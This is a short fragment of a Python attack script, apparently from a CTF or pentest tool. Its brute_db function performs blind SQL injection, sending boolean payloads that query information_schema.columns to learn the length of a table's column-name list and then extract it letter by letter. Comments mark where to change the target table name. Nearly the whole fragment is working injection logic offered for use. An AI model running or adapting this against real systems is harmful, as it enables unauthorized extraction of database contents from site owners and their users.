...
def brute_db(ip):
    ...
    for i in range(0, 100):
        if send_payload(ip, "LENGTH((select group_concat(column_name) from information_schema.columns where table_name='table'))='%d'" % i):   # --- CHANGE TABLE NAME
            length = i
            break
    ...
    for i in range(1, length + 1):
        for j in range(96, 123):
            if send_payload(ip, "SUBSTRING((select group_concat(column_name) from information_schema.columns where table_name='table'),%d, 1) = '%s'" % (i, chr(j))):   # --- CHANGE TABLE NAME
                db_name += chr(j)
